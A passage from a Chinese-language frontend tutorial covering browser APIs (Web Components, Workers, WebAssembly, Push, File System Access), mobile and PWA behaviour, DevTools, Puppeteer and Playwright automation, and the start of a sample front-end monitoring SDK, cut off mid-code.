| API | 用途 | 特点 |
| --- | --- | --- |
| Fetch | HTTP 请求 | Promise、流式 |
| XHR | HTTP 请求 | 事件回调、上传进度 |
| WebSocket | 双向实时 | 全双工、低延迟 |
| SSE | 服务端推送 | 单向、HTTP |
| Beacon | 页面卸载时上报 | 异步、可靠 |
| Background Sync | 离线同步 | SW 中使用 |
| Streams | 流式 IO | 大数据处理 |

---

# 第 12 章 浏览器新特性 API

## 本章学习目标

- 掌握 Web Components、Shadow DOM
- 熟悉 Web Workers、WebAssembly
- 了解现代浏览器新 API（File System Access、Clipboard、Notification、Push）

## 12.1 Web Components

### 12.1.1 Custom Elements

```javascript
// 1. 定义自定义元素
class MyButton extends HTMLElement {
  constructor() {
    super();
    // Step 1：创建 Shadow DOM
    this.attachShadow({ mode: 'open' });
  }

  // Step 2：生命周期
  connectedCallback() {
    this.shadowRoot.innerHTML = `
      <style>
        button {
          background: var(--btn-color, #3b82f6);
          color: white;
          padding: 8px 16px;
          border: none;
          border-radius: 4px;
          cursor: pointer;
        }
      </style>
      <button><slot></slot></button>
    `;
    this.shadowRoot.querySelector('button')
      .addEventListener('click', () => this.dispatchEvent(new CustomEvent('my-click')));
  }

  // 监听属性变化
  static get observedAttributes() {
    return ['disabled'];
  }
  attributeChangedCallback(name, oldValue, newValue) {
    if (name === 'disabled') {
      this.shadowRoot.querySelector('button').disabled = newValue !== null;
    }
  }
}

// 2. 注册
customElements.define('my-button', MyButton);

// 3. 使用
// <my-button>Click me</my-button>
```

### 12.1.2 Shadow DOM

```javascript
// 1. 元素附加 Shadow DOM
const host = document.getElementById('host');
const shadow = host.attachShadow({ mode: 'open' });
// mode: open（可外部访问）/ closed

shadow.innerHTML = `
  <style>p { color: red; }</style>
  <p>Shadow DOM 内容</p>
`;

// 2. 访问
console.log(host.shadowRoot); // open 模式可访问
```

### 12.1.3 HTML Templates

```html
<template id="my-template">
  <style>
    .card { padding: 16px; border: 1px solid #ccc; }
  </style>
  <div class="card">
    <h2><slot name="title"></slot></h2>
    <p><slot name="content">默认内容</slot></p>
  </div>
</template>
```

```javascript
const template = document.getElementById('my-template');
const clone = template.content.cloneNode(true);
document.body.appendChild(clone);
```

### 12.1.4 Lit 框架（推荐）

```javascript
import { LitElement, html, css } from 'lit';

class MyElement extends LitElement {
  static styles = css`
    :host { display: block; }
    button { color: blue; }
  `;

  static properties = {
    count: { type: Number },
  };

  constructor() {
    super();
    this.count = 0;
  }

  render() {
    return html`
      <button @click=${() => this.count++}>
        Count: ${this.count}
      </button>
    `;
  }
}

customElements.define('my-element', MyElement);
```

## 12.2 Web Workers

### 12.2.1 Dedicated Worker

```javascript
// 主线程
const worker = new Worker('worker.js');

worker.postMessage({ type: 'compute', data: [1, 2, 3] });

worker.addEventListener('message', (e) => {
  console.log('Result:', e.data);
});

// 终止
worker.terminate();
```

```javascript
// worker.js
self.addEventListener('message', (e) => {
  if (e.data.type === 'compute') {
    // Step 1：执行耗时计算
    const result = e.data.data.reduce((a, b) => a + b, 0);
    // Step 2：返回结果
    self.postMessage({ result });
  }
});
```

### 12.2.2 Shared Worker

```javascript
// 多个 Tab 共享
const worker = new SharedWorker('shared-worker.js');
worker.port.start();
worker.port.postMessage('hello');
```

### 12.2.3 Worker 中可用 API

```text
可用：
  - setTimeout / setInterval
  - XMLHttpRequest / fetch
  - WebSocket
  - IndexedDB
  - Cache API
  - importScripts
  - postMessage / onmessage
  - WebAssembly

不可用：
  - DOM（document、window）
  - alert / confirm
  - localStorage / sessionStorage
  - Canvas 2D / WebGL（OffscreenCanvas 可用）
```

## 12.3 WebAssembly

### 12.3.1 加载 WASM

```javascript
// 1. fetch + instantiate
const response = await fetch('module.wasm');
const buffer = await response.arrayBuffer();
const module = await WebAssembly.instantiate(buffer);
const instance = module.instance;
const add = instance.exports.add;
console.log(add(1, 2)); // 3

// 2. instantiateStreaming（推荐）
const module = await WebAssembly.instantiateStreaming(
  fetch('module.wasm'),
  {
    env: {
      // 导入 JS 函数
      log: (ptr, len) => console.log('from wasm'),
    },
  }
);
```

### 12.3.2 使用场景

```text
- 计算密集：图像处理、加密解密
- 游戏：Unity / Unreal 编译为 WASM
- 音视频：ffmpeg.wasm
- AI 模型推理
- 跨语言：C/C++/Rust → WASM
```

## 12.4 现代浏览器新 API

### 12.4.1 Clipboard API

```javascript
// 1. 复制
await navigator.clipboard.writeText('hello');
// 2. 粘贴
const text = await navigator.clipboard.readText();
// 3. 复制图片
const blob = new Blob([...], { type: 'image/png' });
await navigator.clipboard.write([
  new ClipboardItem({ 'image/png': blob }),
]);
```

### 12.4.2 Notification API

```javascript
// 1. 请求权限
const permission = await Notification.requestPermission();
// granted / denied / default

// 2. 发送通知
if (permission === 'granted') {
  new Notification('标题', {
    body: '消息内容',
    icon: '/icon.png',
    badge: '/badge.png',
    tag: 'message-1',
    requireInteraction: true,
  });
}
```

### 12.4.3 Push API

```javascript
// 1. 注册 Service Worker
const reg = await navigator.serviceWorker.register('/sw.js');

// 2. 订阅推送
const subscription = await reg.pushManager.subscribe({
  userVisibleOnly: true,
  applicationServerKey: vapidPublicKey,
});

// subscription.endpoint 是推送目标地址
// 发送给服务端

// sw.js
self.addEventListener('push', (e) => {
  const data = e.data.json();
  e.waitUntil(
    self.registration.showNotification(data.title, {
      body: data.body,
      icon: '/icon.png',
    })
  );
});
```

### 12.4.4 File System Access API

```javascript
// 1. 打开文件选择器
const [fileHandle] = await window.showOpenFilePicker();
const file = await fileHandle.getFile();
const content = await file.text();

// 2. 写入文件
const writable = await fileHandle.createWritable();
await writable.write('hello');
await writable.close();

// 3. 保存文件
const handle = await window.showSaveFilePicker();
const writable = await handle.createWritable();
await writable.write(blob);
await writable.close();
```

### 12.4.5 Page Visibility API

```javascript
document.addEventListener('visibilitychange', () => {
  if (document.hidden) {
    // 页面隐藏：暂停视频、停止轮询
  } else {
    // 页面可见：恢复
  }
});

// 获取当前可见性
console.log(document.visibilityState);
// 'visible' | 'hidden' | 'prerender'
```

## 本章要点速查

| API | 用途 | 浏览器支持 |
| --- | --- | --- |
| Web Components | 自定义元素 + 样式隔离 | 主流支持 |
| Web Workers | 后台线程 | 主流支持 |
| WebAssembly | 编译型代码 | 主流支持 |
| Clipboard API | 剪贴板读写 | HTTPS only |
| Notification | 桌面通知 | 主流支持 |
| Push API | 服务端推送 | 主流支持 |
| File System Access | 本地文件 | Chrome/Edge |

---

# 第 13 章 移动端浏览器特殊行为

## 本章学习目标

- 掌握 viewport、meta viewport 配置
- 理解触摸事件、300ms 点击延迟、移动端适配
- 熟悉 iOS Safari 特殊行为
- 掌握 PWA（Progressive Web App）开发要点

## 13.1 视口（Viewport）

### 13.1.1 概念

```text
视口类型：
  - 布局视口（Layout Viewport）：CSS 布局参考区域
  - 视觉视口（Visual Viewport）：用户实际看到的区域
  - 理想视口（Ideal Viewport）：设备宽度（device-width）
```

### 13.1.2 meta viewport

```html
<!-- 关键 viewport 配置 -->
<meta name="viewport" content="
  width=device-width,           <!-- 视口宽度 = 设备宽度 -->
  initial-scale=1.0,            <!-- 初始缩放 -->
  maximum-scale=1.0,            <!-- 最大缩放 -->
  minimum-scale=1.0,            <!-- 最小缩放 -->
  user-scalable=no,             <!-- 禁止缩放 -->
  viewport-fit=cover            <!-- iPhone X+ 适配 -->
">
```

### 13.1.3 适配方案

```text
1. rem 方案
   <script>
     document.documentElement.style.fontSize =
       (document.documentElement.clientWidth / 7.5) + 'px';
   </script>

2. vw/vh 方案
   .box { width: 50vw; }

3. flex/grid 弹性布局
   .container { display: flex; }

4. PostCSS 插件（px → rem/vw）
```

## 13.2 触摸事件

### 13.2.1 TouchEvent

```javascript
element.addEventListener('touchstart', (e) => {
  const touch = e.touches[0];
  console.log('Start at:', touch.clientX, touch.clientY);
});

element.addEventListener('touchmove', (e) => {
  // 注意：必须 preventDefault 才能阻止滚动
  e.preventDefault();
}, { passive: false });

element.addEventListener('touchend', (e) => {
  // e.changedTouches 包含结束的触点
  const touch = e.changedTouches[0];
  console.log('End at:', touch.clientX, touch.clientY);
});
```

### 13.2.2 手势识别

```javascript
// 简单 tap 检测
let touchStartX, touchStartY, touchStartTime;
element.addEventListener('touchstart', (e) => {
  const t = e.touches[0];
  touchStartX = t.clientX;
  touchStartY = t.clientY;
  touchStartTime = Date.now();
});

element.addEventListener('touchend', (e) => {
  const t = e.changedTouches[0];
  const dx = t.clientX - touchStartX;
  const dy = t.clientY - touchStartY;
  const dt = Date.now() - touchStartTime;

  if (dt < 300 && Math.abs(dx) < 10 && Math.abs(dy) < 10) {
    console.log('Tap detected');
  }
});
```

### 13.2.3 PointerEvent（推荐）

```javascript
// 统一鼠标/触摸/笔事件
element.addEventListener('pointerdown', (e) => {
  console.log('Pointer at:', e.clientX, e.clientY, e.pointerType);
});
```

## 13.3 300ms 点击延迟

### 13.3.1 原因

早期移动浏览器等待 300ms 以判断是否为"双击缩放"操作。

### 13.3.2 解决方案

```html
<!-- 1. viewport 设置 width=device-width（最有效） -->
<meta name="viewport" content="width=device-width">

<!-- 2. CSS touch-action -->
<style>
  .no-tap-delay { touch-action: manipulation; }
</style>
```

```javascript
// 3. 引入 fastclick 库（兼容老旧浏览器）
// npm install fastclick
import FastClick from 'fastclick';
FastClick.attach(document.body);
```

## 13.4 iOS Safari 特殊行为

### 13.4.1 橡皮筋效果

```css
body {
  overscroll-behavior: none;  /* 禁止橡皮筋 */
}
```

### 13.4.2 100vh 问题

```css
/* 100vh 在 iOS 上包含地址栏高度 */
.full-height {
  height: 100vh;
  /* 解决：使用 -webkit-fill-available */
  height: -webkit-fill-available;
}
```

### 13.4.3 安全区域

```css
/* iPhone X+ 刘海屏适配 */
.header {
  padding-top: env(safe-area-inset-top);
  padding-bottom: env(safe-area-inset-bottom);
}
```

### 13.4.4 用户选择

```css
/* 禁止长按选择 */
.no-select {
  -webkit-user-select: none;
  user-select: none;
  -webkit-touch-callout: none;
}
```

### 13.4.5 输入法与光标

```css
/* 解决 iOS 输入框光标错位 */
input {
  line-height: normal;
}
```

## 13.5 PWA（Progressive Web App）

### 13.5.1 必备条件

```text
1. HTTPS
2. Web App Manifest
3. Service Worker
4. 响应式设计
```

### 13.5.2 Web App Manifest

```json
{
  "name": "My App",
  "short_name": "App",
  "start_url": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#3b82f6",
  "icons": [
    {
      "src": "/icon-192.png",
      "sizes": "192x192",
      "type": "image/png"
    },
    {
      "src": "/icon-512.png",
      "sizes": "512x512",
      "type": "image/png"
    }
  ]
}
```

```html
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#3b82f6">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
<link rel="apple-touch-icon" href="/icon-192.png">
```

### 13.5.3 Service Worker 注册

```javascript
if ('serviceWorker' in navigator) {
  window.addEventListener('load', () => {
    navigator.serviceWorker.register('/sw.js')
      .then((reg) => console.log('SW registered:', reg.scope))
      .catch((err) => console.error('SW registration failed:', err));
  });
}
```

### 13.5.4 Service Worker 离线策略

```javascript
// sw.js
const CACHE_NAME = 'app-cache-v1';
const urlsToCache = ['/', '/styles.css', '/app.js', '/offline.html'];

self.addEventListener('install', (e) => {
  e.waitUntil(
    caches.open(CACHE_NAME).then((cache) => cache.addAll(urlsToCache))
  );
});

self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then((res) => {
      // 缓存优先
      if (res) return res;

      return fetch(e.request).then((response) => {
        // 仅缓存成功响应
        if (response && response.status === 200) {
          const clone = response.clone();
          caches.open(CACHE_NAME).then((cache) => {
            cache.put(e.request, clone);
          });
        }
        return response;
      }).catch(() => {
        // 离线降级
        return caches.match('/offline.html');
      });
    })
  );
});

self.addEventListener('activate', (e) => {
  e.waitUntil(
    caches.keys().then((keys) => Promise.all(
      keys.filter((key) => key !== CACHE_NAME)
          .map((key) => caches.delete(key))
    ))
  );
});
```

### 13.5.5 桌面图标安装

```javascript
window.addEventListener('beforeinstallprompt', (e) => {
  e.preventDefault();
  // 提示用户安装
  deferredPrompt = e;
});

button.addEventListener('click', () => {
  deferredPrompt.prompt();
  deferredPrompt.userChoice.then((choice) => {
    if (choice.outcome === 'accepted') {
      console.log('Installed');
    }
  });
});
```

## 本章要点速查

| 概念 | 关键点 |
| --- | --- |
| viewport | width=device-width |
| 300ms 延迟 | viewport + touch-action |
| iOS 100vh | -webkit-fill-available |
| 安全区 | env(safe-area-inset-*) |
| PWA | Manifest + SW + HTTPS |

---

# 第 14 章 浏览器自动化与调试

## 本章学习目标

- 掌握 Chrome DevTools 核心面板的使用
- 理解 Chrome DevTools Protocol（CDP）
- 掌握 Puppeteer、Playwright 自动化方案
- 能够进行性能分析与瓶颈定位

## 14.1 Chrome DevTools 核心面板

### 14.1.1 Elements 面板

```text
功能：
  - DOM 树查看与编辑
  - CSS 样式查看与修改
  - Box Model 盒模型查看
  - Computed Style 最终样式
  - Event Listeners 事件监听
  - DOM Breakpoints
  - Accessibility 树

技巧：
  - 点击节点可定位到代码（Sources → Reveal in Tree）
  - 右侧 Styles 面板可实时编辑
  - 可在 Computed 面板搜索属性
```

### 14.1.2 Console 面板

```javascript
// 常用 API
console.log('普通日志');
console.warn('警告');
console.error('错误');
console.info('信息');

console.table([{ a: 1, b: 2 }, { a: 3, b: 4 }]);

console.group('Group');
console.log('item 1');
console.groupEnd();

console.time('loop');
for (let i = 0; i < 1000; i++) {}
console.timeEnd('loop');

console.trace();
console.assert(condition, 'message');
console.dir(object);  // 展开对象

// 占位符
console.log('Name: %s, Age: %d', 'alice', 30);
console.log('Object: %o', { a: 1 });
```

### 14.1.3 Sources 面板

```text
功能：
  - 源码查看、编辑
  - 断点（Breakpoint）
  - 条件断点
  - 日志点（Logpoint）
  - 异常暂停
  - 调用栈
  - 作用域变量
  - Watch 表达式

快捷键：
  - F8 / Cmd+\：继续
  - F10 / Cmd+': 单步跳过
  - F11 / Cmd+;: 单步进入
  - Shift+F11 / Shift+Cmd+;: 单步退出
  - Cmd+B：切换断点
```

### 14.1.4 Network 面板

```text
列：
  - Name：资源名
  - Status：HTTP 状态
  - Type：资源类型
  - Initiator：发起者
  - Size：大小
  - Time：耗时
  - Waterfall：瀑布图

过滤：
  - All / XHR / JS / CSS / Img / Media / Doc / WS / Other
  - 状态码过滤
  - 大于指定大小

技巧：
  - 右键 → Copy as cURL
  - 右键 → Block request URL
  - Throttling 节流模拟
  - Disable cache 关闭缓存
```

### 14.1.5 Performance 面板

```text
录制流程：
  1. 点击录制按钮
  2. 执行用户操作
  3. 停止录制
  4. 分析结果

主要内容：
  - FPS 帧率
  - CPU 占用
  - 主线程火焰图
  - 合成线程
  - 内存使用

底部 Summary：
  - Loading / Scripting / Rendering / Painting
  - 各阶段耗时
```

### 14.1.6 Memory 面板

```text
三种模式：
  1. Heap Snapshot：堆快照
     - 找内存泄漏
     - 比较两次快照找增量
  2. Allocation Instrumentation
     - 实时分配追踪
  3. Allocation Sampling
     - 抽样统计
```

### 14.1.7 Application 面板

```text
- LocalStorage / SessionStorage
- IndexedDB
- Cookies
- Cache Storage
- Service Workers
- Manifest
- Background Services
```

### 14.1.8 Security 面板

```text
- HTTPS 状态
- 证书信息
- 混合内容警告
- CSP
```

## 14.2 Chrome DevTools Protocol（CDP）

### 14.2.1 概述

```text
CDP 是 Chrome 提供的基于 WebSocket 的协议：
  - 命令（Command）：Page.navigate、DOM.getDocument
  - 事件（Event）：Page.loadEventFired、Network.requestWillBeSent
  - 域（Domain）：Page、Network、DOM、Runtime
```

### 14.2.2 CDP 使用

```javascript
// 启动 Chrome：--remote-debugging-port=9222
// 获取 WebSocket URL
const list = await fetch('http://localhost:9222/json').then(r => r.json());
const wsUrl = list[0].webSocketDebuggerUrl;

// 连接 CDP
const ws = new WebSocket(wsUrl);
ws.onmessage = (e) => {
  const msg = JSON.parse(e.data);
  if (msg.method === 'Network.responseReceived') {
    console.log(msg.params);
  }
};

// 发送命令
ws.send(JSON.stringify({
  id: 1,
  method: 'Runtime.evaluate',
  params: { expression: 'document.title' },
}));
```

## 14.3 Puppeteer

### 14.3.1 基础使用

```javascript
import puppeteer from 'puppeteer';

const browser = await puppeteer.launch({
  headless: false,
  defaultViewport: { width: 1280, height: 800 },
});

const page = await browser.newPage();

// 导航到页面
await page.goto('https://example.com', { waitUntil: 'networkidle2' });

// 截图
await page.screenshot({ path: 'screenshot.png' });

// PDF
await page.pdf({ path: 'page.pdf', format: 'A4' });

// 点击元素
await page.click('#button');

// 输入文本
await page.type('#input', 'hello world');

// 获取页面内容
const title = await page.title();
const text = await page.$eval('#content', el => el.textContent);

// 等待元素
await page.waitForSelector('.result');

// 监听网络请求
page.on('request', (req) => console.log(req.url()));
page.on('response', (res) => console.log(res.status()));

// 拦截请求
await page.setRequestInterception(true);
page.on('request', (req) => {
  if (req.resourceType() === 'image') req.abort();
  else req.continue();
});

await browser.close();
```

### 14.3.2 性能分析

```javascript
// 开启性能追踪
await page.tracing.start({ categories: ['devtools.timeline'] });
await page.goto(url);
const trace = await page.tracing.stop();

// 使用 CDP 收集指标
const client = await page.target().createCDPSession();
await client.send('Performance.enable');
const metrics = await client.send('Performance.getMetrics');
metrics.forEach(m => console.log(`${m.name}: ${m.value}`));
```

## 14.4 Playwright

### 14.4.1 特点

```text
- 多浏览器支持（Chromium / Firefox / WebKit）
- 自动等待机制
- 并行执行
- 内置截图、录制、视频
- 更现代的 API 设计
```

### 14.4.2 基础使用

```javascript
import { chromium } from 'playwright';

const browser = await chromium.launch({ headless: false });
const context = await browser.newContext({
  viewport: { width: 1280, height: 800 },
});
const page = await context.newPage();

await page.goto('https://example.com');
await page.fill('#search', 'playwright');
await page.press('#search', 'Enter');
await page.waitForLoadState('networkidle');

await page.screenshot({ path: 'result.png' });

await browser.close();
```

## 14.5 性能分析实战

### 14.5.1 Lighthouse

```bash
# CLI 使用
npx lighthouse https://example.com --output html --output-path report.html --view

# Node.js API
const lighthouse = require('lighthouse');
const chromeLauncher = require('chrome-launcher');

async function runLighthouse(url) {
  // Step 1：启动 Chrome
  const chrome = await chromeLauncher.launch({ chromeFlags: ['--headless'] });

  // Step 2：运行 Lighthouse
  const results = await lighthouse(url, {
    port: chrome.port,
    output: 'json',
    onlyCategories: ['performance', 'accessibility', 'best-practices', 'seo'],
  });

  // Step 3：输出结果
  console.log(JSON.stringify(results.lhr.categories.performance.score));

  await chrome.kill();
}
```

### 14.5.2 自定义性能监控

```javascript
class PerformanceMonitor {
  constructor() {
    this.metrics = {};
    this.init();
  }

  init() {
    // Step 1：监听 Paint Timing API
    this.observePaintTiming();

    // Step 2：监听 Navigation Timing
    this.observeNavigationTiming();

    // Step 3：监听 Long Task
    this.observeLongTasks();

    // Step 4：监听 Layout Shift
    this.observeLayoutShift();

    // Step 5：定期上报
    setInterval(() => this.report(), 60000);
  }

  observePaintTiming() {
    const observer = new PerformanceObserver((list) => {
      for (const entry of list.getEntries()) {
        this.metrics[entry.name] = entry.startTime;
      }
    });
    observer.observe({ type: 'paint', buffered: true });
  }

  observeNavigationTiming() {
    const nav = performance.getEntriesByType('navigation')[0];
    if (nav) {
      this.metrics.dns = nav.domainLookupEnd - nav.domainLookupStart;
      this.metrics.tcp = nav.connectEnd - nav.connectStart;
      this.metrics.ttfb = nav.responseStart - nav.requestStart;
      this.metrics.domReady = nav.domContentLoadedEventEnd;
      this.metrics.loadComplete = nav.loadEventEnd;
    }
  }

  observeLongTasks() {
    const observer = new PerformanceObserver((list) => {
      for (const entry of list.getEntries()) {
        this.longTasks.push(entry.duration);
      }
    });
    observer.observe({ type: 'longtask', buffered: true });
  }

  observeLayoutShift() {
    let clsValue = 0;
    const observer = new PerformanceObserver((list) => {
      for (const entry of list.getEntries()) {
        if (!entry.hadRecentInput) {
          clsValue += entry.value;
        }
      }
      this.metrics.cls = clsValue;
    });
    observer.observe({ type: 'layout-shift', buffered: true });
  }

  async report() {
    try {
      await fetch('/api/performance', {
        method: 'POST',
        body: JSON.stringify(this.metrics),
      });
    } catch (e) {
      console.error('Report failed:', e);
    }
  }
}

new PerformanceMonitor();
```

## 14.6 调试技巧

### 14.6.1 断点调试技巧

```javascript
// 1. debugger 语句
function complexFunction(x) {
  debugger;  // 强制断点
  return x * 2;
}

// 2. 条件断点
// 在 Sources 面板右键断点 → Edit breakpoint → 输入条件
// 例：x > 100

// 3. 日志断点
// 右键断点 → Add logpoint → 输入表达式
// 例：`x is ${x}`

// 4. DOM 变化断点
// Elements 面板 → 右键节点 → Break on → subtree modifications

// 5. XHR 断点
// Sources 面板 → XHR/fetch breakpoints → 添加 URL 片段
```

### 14.6.2 Console 高级用法

```javascript
// 1. $0-$4 访问最近选中的元素
$0.style.color = 'red';

// 2. $(selector) === document.querySelector
// $$ === document.querySelectorAll

// 3. copy() 复制到剪贴板
copy(document.documentElement.outerHTML);

// 4. monitorEvents()
monitorEvents(window, 'resize');  // 监控事件

// 5. getEventListeners()
getEventListeners(button);  // 查看所有监听器

// 6. queryObjects(MyClass)
queryObjects(MyClass);  // 查看所有实例

// 7. profile() 性能分析
profile('My Profile');
// ... 执行代码 ...
profileEnd('My Profile');
```

## 本章要点速查

| 面板 | 用途 |
| --- | --- |
| Elements | DOM/CSS 查看、编辑 |
| Console | 日志输出、JS 执行 |
| Sources | 断点调试、源码查看 |
| Network | 网络请求分析 |
| Performance | 性能录制与分析 |
| Memory | 内存泄漏检测 |
| Application | 存储查看 |

---

# 附录 A 浏览器知识速查表

## A.1 渲染相关

| 场景 | 方案 | 注意事项 |
| --- | --- | --- |
| 减少重排 | transform 替代 top/left | GPU 合成层 |
| 大量 DOM 操作 | DocumentFragment / 虚拟列表 | 批量插入 |
| 图片懒加载 | Intersection Observer | 兼容性良好 |
| 字体加载优化 | font-display: swap | 避免 FOIT |
| CSS 动画 | will-change + transform | 合成线程处理 |

## A.2 JavaScript 相关

| 场景 | 方案 |
| --- | --- |
| 防抖 | lodash.debounce 或自定义 |
| 节流 | lodash.throttle 或 rAF |
| 大计算量 | Web Worker |
| 异步流程控制 | Promise.all / Promise.allSettled |
| 错误边界 | ErrorBoundary（React）/ error-captured（Vue） |
| 类型检查 | TypeScript / JSDoc |

## A.3 网络相关

| 场景 | 方案 |
| --- | --- |
| DNS 预解析 | <link rel="dns-prefetch"> |
| 预连接 | <link rel="preconnect"> |
| 预加载 | <link rel="preload"> |
| 预取 | <link rel="prefetch"> |
| HTTP 缓存 | Cache-Control / ETag |
| Service Worker | 离线缓存策略 |

## A.4 安全相关

| 攻击类型 | 防御方案 |
| --- | --- |
| XSS | CSP + 输出转义 + HttpOnly |
| CSRF | SameSite + Token |
| Clickjacking | X-Frame-Options |
| 中间人攻击 | HSTS + HTTPS |
| 注入攻击 | 参数化查询 |

## A.5 移动端适配

| 问题 | 解决方案 |
| --- | --- |
| 视口宽度 | meta viewport |
| 1px 边框 | border-image / transform scale |
| 安全区域 | env(safe-area-inset-*) |
| 300ms 延迟 | viewport + touch-action |
| 软键盘遮挡 | scrollIntoView / visualViewport |

---

# 附录 B 综合实战案例：浏览器端监控 SDK

## B.1 SDK 架构设计

```mermaid
graph TB
  A[用户浏览器] --> B[SDK Core 核心]
  B --> C[数据采集模块]
  B --> D[数据处理模块]
  B --> E[上报传输模块]
  B --> F[配置管理模块]

  C --> C1[Performance]
  C --> C2[Error]
  C --> C3[Behavior]
  C --> C4[Resource]

  D --> D1[过滤]
  D --> D2[聚合]
  D --> D3[采样]

  E --> E1[XHR Beacon]
  E --> E2[Image Beacon]
  E --> E3[SendBeacon]
```

## B.2 完整实现

```javascript
/**
 * 浏览器端前端监控 SDK
 * 功能：性能采集、错误捕获、行为记录、资源监控
 */

class MonitorSDK {
  /**
   * Step 1：初始化 SDK
   * @param {Object} options 配置项
   */
  constructor(options = {}) {
    // 配置项
    this.config = {
      appId: options.appId || '',
      dsn: options.dsn || '',                    // 上报地址
      sampleRate: options.sampleRate || 1,         // 采样率
      maxErrors: options.maxErrors || 20,          // 最大错误数
      maxBehaviors: options.maxBehaviors || 10,    // 最大行为数
      autoTrack: options.autoTrack !== false,       // 自动采集
      ...options,
    };

    // 数据存储
    this.errors = [];           // 错误队列
    this.behaviors = [];        // 行为队列
    this.resources = [];        // 资源队列
    this.metrics = {};          // 性能指标

    // 状态标记
    this.isInitialized = false;
    this.sessionId = this.generateSessionId();

    // 初始化各模块
    if (this.config.autoTrack) {
      this.initAllModules();
    }
  }

  /**
   * Step 2：生成会话 ID
   */
  generateSessionId() {
    return `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  }

  /**
   * Step 3：初始化所有采集模块
   */
  initAllModules() {
    this.initPerformance();     // 性能采集
    this.initErrorCapture();     // 错误捕获
    this.initBehaviorTracker();  // 行为追踪
    this.initResourceMonitor();  // 资源监控
    this.initReporter();         // 上报器

    this.isInitialized = true;

    // 页面卸载时强制上报
    window.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        this.flush();
      }
    });

    window.addEventListener('beforeunload', () => {
      this.flush(true);  // 使用 sendBeacon
    });
  }

  // ==================== 性能采集 ====================

  /**
   * Step 4：初始化性能采集
   */
  initPerformance() {
    // 确保 DOMContentLoaded 后采集
    if (document.readyState === 'complete') {
      this.collectPerformance();
    } else {
      window.addEventListener('load', () => {
        setTimeout(() => this.collectPerformance(), 0);
      });
    }
  }

  collectPerformance() {
    const perf = performance.getEntriesByType('navigation')[0];
    if (!perf) return;

    // 核心性能指标
    this.metrics = {
      // 首字节时间
      ttfb: Math.round(perf.responseStart - perf.requestStart),
      // 首次内容绘制
      fcp: this.getFirstContentfulPaint(),
      // 最大内容绘制
      lcp: this.getLargestContentfulPaint(),
      // DOM 就绪时间
      domReady: Math.round(perf.domContentLoadedEventEnd - perf.fetchStart),
      // 完全加载时间
      loadTime: Math.round(perf.loadEventEnd - perf.fetchStart),
      // DNS 解析耗时
      dns: Math.round(perf.domainLookupEnd - perf.domainLookupStart),
      // TCP 连接耗时
      tcp: Math.round(perf.connectEnd - perf.connectStart),
      // SSL 握手耗时
      ssl: perf.secureConnectionStart > 0 ?
        Math.round(perf.connectEnd - perf.secureConnectionStart) : 0,
      // TTFB
      responseStart: Math.round(perf.responseStart - perf.fetchStart),
    };

    // 上报性能数据
    this.report('performance', this.metrics);
  }

  getFirstContentfulPaint() {
    const fcpEntry = performance.getEntriesByName('first-contentful-paint')[0];
    return fcpEntry ? Math.round(fcpEntry.startTime) : null;
  }

  getLargestContentfulPaint() {
    const entries = performance.getEntriesByType('largest-contentful-paint');
    const last = entries[entries.length - 1];
    return last ? Math.round(last.startTime) : null;
  }

  // ==================== 错误捕获 ====================

  /**
   * Step 5：初始化错误捕获
   */
  initErrorCapture() {
    // JS 运行时错误
    window.addEventListener('error', (e) => {
      this.captureError({
        type: 'js',
        message: e.message,
        filename: e.filename,
        lineno: e.lineno,
        colno: e.colno,
        stack: e.error?.stack || '',
        timestamp: Date.now(),
      });
    }, true);

    // Promise 未捕获异常
    window.addEventListener('unhandledrejection', (e) => {
      this.captureError({
        type: 'promise',
        message: e.reason?.message || String(e.reason),
        stack: e.reason?.stack || '',
        timestamp: Date.now(),
      });
    });

    // 资源加载错误
    window.addEventListener('error', (e) => {
      if (e.target !== window) {
        this.captureError({
          type: 'resource',
          message: `Resource load failed: ${e.target.src || e.target.href}`,
          tagName: e.target.tagName.toLowerCase(),
          src: e.target.src || e.target.href,
          timestamp: Date.now(),
        });
      }
    }, true);

    // Vue 错误捕获（如果存在）
    if (window.__VUE__) {
      // Vue 2
      if (window.__VUE__.config && window.__VUE__.config.errorHandler) {
        const original = window.__VUE__.config.errorHandler;
        window.__VUE__.config.errorHandler = (err, vm, info) => {
          this.captureError({
            type: 'vue',
            message: err.message,
            stack: err.stack,
            info,
            timestamp: Date.now(),
          });
          original(err, vm, info);
        };
      }
    }

    // React 错误边界辅助
    if (typeof window !== 'undefined') {
      window.__MONITOR_ERROR__ = (error, errorInfo) => {
        this.captureError({
          type: 'react',
          message: error.message,
          stack: error.stack,
          componentStack: errorInfo,
          timestamp: Date.now(),
        });
      };
    }
  }

  captureError(error) {
    // 限制最大错误数量
    if (this.errors.length >= this.config.maxErrors) {
      this.errors.shift();
    }

    this.errors.push(error);

    // 实时上报关键错误
    if (error.type === 'js' || error.type === 'promise') {
      this.report('error', error);
    }
  }

  // ==================== 行为追踪 ====================

  /**
   * Step 6：初始化行为追踪
   */
  initBehaviorTracker() {
    // 点击行为
    document.addEventListener('click', (e) => {
      this.trackBehavior({
        type: 'click',
        target: this.getElementPath(e.target),
        x: e.clientX,
        y: e.clientY,
        timestamp: Date.now(),
      });
    }, true);

    // 输入行为
    document.addEventListener('input', (e) => {
      this.trackBehavior({
        type: 'input',
        target: this.getElementPath(e.target),
        value: e.target.value?.length || 0,
        timestamp: Date.now(),
      });
    }, true);

    // 路由变化（SPA）
    this.trackRouteChange();
  }

  getElementPath(el) {
    const path = [];
    while (el && el !== document.body) {
      let selector = el.tagName.toLowerCase();
      if (el.id) selector += '#' + el.id;
      if (el.className && typeof el.className === 'string') {
        selector += '.' + el.className.trim().split(/\s+/).join('.');
      }
      path.unshift(selector);
      el = el.parentElement;
    }
    return path.join(' > ');
  }

  trackBehavior(behavior) {
    // 限制最大行为数量
    if (this.behaviors.length >= this.config.maxBehaviors) {
      this.behaviors.shift();
    }
    this.behaviors.push(behavior);
  }

  trackRouteChange() {
    // Hash 路由
    let lastHash = location.hash;
    window.addEventListener('hashchange', () => {
      this.trackBehavior({
        type: 'route',
        from: lastHash,
        to: location.hash,
        timestamp: Date.now(),
      });
      lastHash = location.hash;
    });

    // History API 劫持
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

